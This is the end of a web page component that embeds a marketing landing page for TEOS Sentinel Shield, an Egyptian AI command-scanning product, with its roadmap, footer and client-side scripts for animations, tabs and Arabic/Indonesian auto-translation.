    <p>TEOS Sentinel is not built for Silicon Valley's threat model. It is built for autonomous AI systems operating in MENA and GCC contexts — where data sovereignty, regulatory alignment, and government accountability are non-negotiable.</p>
    <p>Aligned with the TEOS International Civic Blockchain Constitution (ICBC). Attending Consensus Hong Kong 2026 and Consensus Miami 2026.</p>
    <p style="color:var(--alabaster);">Law governs execution. Humans govern systems. AI serves authority.</p>
    <div class="sovereign-pills">
      <span class="spill">MENA Sovereign Architecture</span>
      <span class="spill">ICBC Constitutional Alignment</span>
      <span class="spill">Elmahrosa International</span>
      <span class="spill">Alexandria, Egypt</span>
      <span class="spill">75+ Nations</span>
      <span class="spill">Consensus HK 2026</span>
      <span class="spill">Consensus Miami 2026</span>
    </div>
  </div>
  <div class="sov-metrics reveal">
    <div class="smet"><div class="smet-n">75+</div><div class="smet-l">Nations in community</div></div>
    <div class="smet"><div class="smet-n">528</div><div class="smet-l">Community members</div></div>
    <div class="smet"><div class="smet-n">3</div><div class="smet-l">Active scan engines</div></div>
    <div class="smet"><div class="smet-n">v2.0</div><div class="smet-l">Engine stable</div></div>
  </div>
</div>

<!-- ROADMAP -->
<div class="roadmap-bg" id="roadmap">
  <div class="section-wrap" style="padding-top:0;padding-bottom:0;">
    <div class="section-label reveal">2026 Roadmap</div>
    <h2 class="section-title reveal">What's <span class="gold">next.</span></h2>
    <p class="section-sub reveal">Attending Consensus HK 2026 + Miami 2026. <a href="mailto:ayman@teosegypt.com" style="color:var(--gold);text-decoration:none;">Book a meeting →</a></p>
    <div class="roadmap-grid reveal">
      <div class="rm-card live">
        <div class="rm-q live-q"><span class="rm-dot"></span>Live Now</div>
        <div class="rm-title">Engine v2 + Telegram Bot</div>
        <p class="rm-desc">25 named rules. 37 tests passing. /scan, /deps, /ci — all live. Engine v2 production stable. 3 PM2 services online.</p>
      </div>
      <div class="rm-card">
        <div class="rm-q">Q2 2026</div>
        <div class="rm-title">Government Pilots — Egypt + UAE</div>
        <p class="rm-desc">ITIDA, MCIT, UAE AI Office pilots. First institutional contracts. Sovereign deployment package.</p>
      </div>
      <div class="rm-card">
        <div class="rm-q">Q3 2026</div>
        <div class="rm-title">Policy Engine UI + GitHub App</div>
        <p class="rm-desc">Enterprise self-service. Custom threat rules per org. Auto-scan on push. BLOCK alerts in Telegram.</p>
      </div>
      <div class="rm-card">
        <div class="rm-q">Q4 2026</div>
        <div class="rm-title">Saudi — SDAIA + NEOM</div>
        <p class="rm-desc">Full sovereign deployment. NEOM autonomous systems integration. SDAIA compliance audit trail.</p>
      </div>
    </div>
  </div>
</div>

<!-- FINAL CTA -->
<section class="final-cta">
  <div class="egy-corner tl"></div><div class="egy-corner tr"></div>
  <div class="egy-corner bl"></div><div class="egy-corner br"></div>
  <h2>Start free.<br><span class="gold">Block the first threat</span><br>in 60 seconds.</h2>
  <p>Open Telegram. Message @teoslinker_bot. Paste your first command. Get your verdict. No account. No credit card.</p>
  <div class="final-btns">
    <a href="https://t.me/teoslinker_bot" class="btn-primary">𓂀 Open @teoslinker_bot →</a>
    <a href="mailto:ayman@teosegypt.com" class="btn-secondary">Enterprise / Gov inquiry →</a>
  </div>
</section>

<!-- FOOTER -->
<footer>
  <div class="footer-inner">
    <div>
      <div class="foot-brand-name">𓂀 TEOS Sentinel Shield</div>
      <p class="foot-brand-desc">Execution Control Infrastructure for Autonomous AI.<br>Built in Alexandria, Egypt by Elmahrosa International.<br>Law governs execution. Humans govern systems. AI serves authority.</p>
      <a href="mailto:ayman@teosegypt.com" class="foot-contact">ayman@teosegypt.com</a>
    </div>
    <div class="foot-col">
      <h5>Product</h5>
      <ul>
        <li><a href="https://t.me/teoslinker_bot">Telegram Bot</a></li>
        <li><a href="#features">Features</a></li>
        <li><a href="#pricing">Pricing</a></li>
        <li><a href="https://github.com/Elmahrosa/teos-sentinel-shield">GitHub</a></li>
      </ul>
    </div>
    <div class="foot-col">
      <h5>Community</h5>
      <ul>
        <li><a href="https://t.me/Elmahrosapi">Elmahrosapi (75+ nations)</a></li>
        <li><a href="https://linkedin.com/in/aymanseif">Founder LinkedIn</a></li>
        <li><a href="https://x.com/king_teos">X / Twitter</a></li>
        <li><a href="https://linkedin.com/company/teos-pharaoh-portal">Company</a></li>
      </ul>
    </div>
    <div class="foot-col">
      <h5>Government</h5>
      <ul>
        <li><a href="mailto:ayman@teosegypt.com">Egypt Pilot (ITIDA)</a></li>
        <li><a href="mailto:ayman@teosegypt.com">UAE Pilot (AI Office)</a></li>
        <li><a href="mailto:ayman@teosegypt.com">Saudi Pilot (SDAIA)</a></li>
        <li><a href="https://github.com/Elmahrosa/Teos-International-Civic-Blockchain-Constitution">ICBC Constitution</a></li>
      </ul>
    </div>
  </div>
  <div class="footer-bottom">
    <span>© 2026 Elmahrosa International · Alexandria, Egypt · Engine v2.0</span>
    <span>Law governs execution. Humans govern systems. AI serves authority.</span>
  </div>
</footer>

<script>
// ══ SCROLL REVEAL ══
const obs = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) { e.target.classList.add('visible'); obs.unobserve(e.target); }
  });
}, { threshold: 0.08 });
document.querySelectorAll('.reveal').forEach(el => obs.observe(el));

// ══ COUNTERS ══
const cObs = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (!e.isIntersecting) return;
    const el = e.target, target = parseInt(el.dataset.target);
    let cur = 0; const step = target / 50;
    const t = setInterval(() => {
      cur += step;
      if (cur >= target) { el.textContent = target; clearInterval(t); }
      else { el.textContent = Math.floor(cur); }
    }, 24);
    cObs.unobserve(el);
  });
}, { threshold: 0.5 });
document.querySelectorAll('[data-target]').forEach(el => cObs.observe(el));

// ══ GOVERNMENT TABS ══
function setGov(btn, country) {
  document.querySelectorAll('.gov-tab').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.gov-panel').forEach(p => p.classList.remove('active'));
  btn.classList.add('active');
  const p = document.getElementById('gov-' + country);
  if (p) p.classList.add('active');
}

// ══ LANGUAGE SWITCHER ══
function toggleLangMenu(e) {
  e.stopPropagation();
  document.getElementById('langBtn').classList.toggle('open');
  document.getElementById('langDropdown').classList.toggle('open');
}
function closeLangMenu() {
  document.getElementById('langBtn').classList.remove('open');
  document.getElementById('langDropdown').classList.remove('open');
}
document.addEventListener('click', e => {
  const sw = document.getElementById('langSwitcher');
  if (sw && !sw.contains(e.target)) closeLangMenu();
});

// ══ AUTO TRANSLATE ══
let currentLang = 'en';
let originals = new Map();
let cache = {};
const SKIP = ['.term-body','code','pre','.threat-ticker','.engine-stats-section','.video-timeline','script','style','.vt-code'];

const BUILT_IN = {
  ar: {
    'Demo':'عرض','Features':'المميزات','Compare':'مقارنة','Government':'الحكومة','Pricing':'الأسعار',
    'Try Free →':'جرب مجاناً →','MCP Engine v2.0 — Online':'محرك MCP v2.0 — متصل',
    'Telegram Bot — Online':'بوت تيليغرام — متصل','25 Named Rules Active':'25 قاعدة نشطة',
    '37 Tests Passing':'37 اختبار ناجح','Generate → Validate →':'توليد → تحقق →',
    'Three engines.':'ثلاثة محركات.','One interface.':'واجهة واحدة.',
    'Stay protected.':'ابقَ محمياً.','Choose your level.':'اختر مستواك.',
    'Start free.':'ابدأ مجاناً.','in 60 seconds.':'في 60 ثانية.',
    'Get Started →':'ابدأ الآن →','Get Protected →':'احصل على الحماية →','Go Pro →':'Pro انتقل إلى →',
    '🇪🇬 Egypt — Start Here':'🇪🇬 مصر — ابدأ هنا',
    '🇦🇪 UAE — Fast Track':'🇦🇪 الإمارات — المسار السريع',
    '🇸🇦 Saudi — Big Contracts':'🇸🇦 السعودية — العقود الكبيرة',
  },
  id: {
    'Demo':'Demo','Features':'Fitur','Compare':'Bandingkan','Government':'Pemerintah','Pricing':'Harga',
    'Try Free →':'Coba Gratis →','MCP Engine v2.0 — Online':'Mesin MCP v2.0 — Online',
    'Telegram Bot — Online':'Bot Telegram — Online','25 Named Rules Active':'25 Aturan Aktif',
    '37 Tests Passing':'37 Tes Berhasil','Generate → Validate →':'Hasilkan → Validasi →',
    'Three engines.':'Tiga mesin.','One interface.':'Satu antarmuka.',
    'Stay protected.':'Tetap terlindungi.','Choose your level.':'Pilih tingkatan Anda.',
    'Start free.':'Mulai gratis.','in 60 seconds.':'dalam 60 detik.',
    'Get Started →':'Mulai Sekarang →','Get Protected →':'Dapatkan Perlindungan →','Go Pro →':'Tingkatkan ke Pro →',
    '🇪🇬 Egypt — Start Here':'🇪🇬 Mesir — Mulai Di Sini',
    '🇦🇪 UAE — Fast Track':'🇦🇪 UEA — Jalur Cepat',
    '🇸🇦 Saudi — Big Contracts':'🇸🇦 Saudi — Kontrak Besar',
  }
};

function skipNode(node) {
  let el = node.parentElement;
  while (el) {
    for (const s of SKIP) { try { if (el.matches(s)) return true; } catch(e) {} }
    el = el.parentElement;
  }
  return false;
}

function textNodes(root) {
  const w = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, {
    acceptNode(n) {
      const t = n.textContent.trim();
      if (!t || t.length < 2) return NodeFilter.FILTER_REJECT;
      if (skipNode(n)) return NodeFilter.FILTER_REJECT;
      return NodeFilter.FILTER_ACCEPT;
    }
  });
  const r = []; let n;
  while ((n = w.nextNode())) r.push(n);
  return r;
}

function storeOrig() {
  textNodes(document.body).forEach((n, i) => {
    n._tk = 'n' + i; originals.set('n' + i, n.textContent);
  });
}

function bar(pct) {
  const b = document.getElementById('translateBar'), f = document.getElementById('translateFill');
  b.style.display = 'block'; f.style.width = pct + '%';
  if (pct >= 100) setTimeout(() => { b.style.display = 'none'; f.style.width = '0%'; }, 500);
}

function toast(flag, msg) {
  const t = document.getElementById('translateToast');
  document.getElementById('toastFlag').textContent = flag;
  document.getElementById('toastMsg').textContent = msg;
  t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 2500);
}

async function gTranslate(texts, lang) {
  const res = []; const bs = 15;
  for (let i = 0; i < texts.length; i += bs) {
    const batch = texts.slice(i, i + bs);
    try {
      const url = 'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=' + lang + '&dt=t&q=' + encodeURIComponent(batch.join('\n|||\n'));
      const d = await (await fetch(url)).json();
      const combined = d[0].map(s => s[0]).join('');
      combined.split('|||').map(s => s.trim()).forEach((p, idx) => res.push(p || batch[idx]));
    } catch (e) { batch.forEach(t => res.push(t)); }
    bar(Math.min(88, Math.round(((i + bs) / texts.length) * 88)));
    await new Promise(r => setTimeout(r, 80));
  }
  return res;
}

async function switchLang(lang, flag, label, rtl) {
  if (lang === currentLang) { closeLangMenu(); return; }
  document.getElementById('currentFlag').textContent = flag;
  document.getElementById('currentLangLabel').textContent = label;
  document.querySelectorAll('.lang-option').forEach(o => o.classList.remove('active'));
  document.getElementById('opt-' + lang).classList.add('active');
  document.documentElement.setAttribute('dir', rtl ? 'rtl' : 'ltr');
  closeLangMenu();

  if (lang === 'en') {
    textNodes(document.body).forEach(n => { if (n._tk && originals.has(n._tk)) n.textContent = originals.get(n._tk); });
    currentLang = 'en'; toast('🇺🇸', 'Switched to English'); return;
  }

  bar(10); toast(flag, lang === 'ar' ? 'جاري الترجمة...' : 'Menerjemahkan...');
  const nodes = textNodes(document.body);
  const bi = BUILT_IN[lang] || {};
  const need = [], idx = [];
  nodes.forEach((n, i) => {
    const orig = originals.get(n._tk) || n.textContent;
    if (bi[orig.trim()]) n.textContent = bi[orig.trim()];
    else if (orig.trim().length > 3) { need.push(orig); idx.push(i); }
  });
  bar(30);
  if (need.length) {
    const ck = need.join('|||') + '__' + lang;
    const tr = cache[ck] || (cache[ck] = await gTranslate(need, lang));
    idx.forEach((ni, i) => { if (tr[i]) nodes[ni].textContent = tr[i]; });
  }
  bar(100); currentLang = lang;
  toast(flag, lang === 'ar' ? 'تمت الترجمة ✓' : 'Diterjemahkan ✓');
}

window.addEventListener('load', () => setTimeout(storeOrig, 600));
</script>
</body>
</html>`;

export default function Page() {
  return (
    <iframe
      srcDoc={HTML}
      style={{
        position: 'fixed',
        top: 0,
        left: 0,
        width: '100%',
        height: '100%',
        border: 'none',
        margin: 0,
        padding: 0,
        overflow: 'hidden',
        zIndex: 9999,
        background: '#05040a',
      }}
      title="TEOS Sentinel Shield"
    />
  );
}
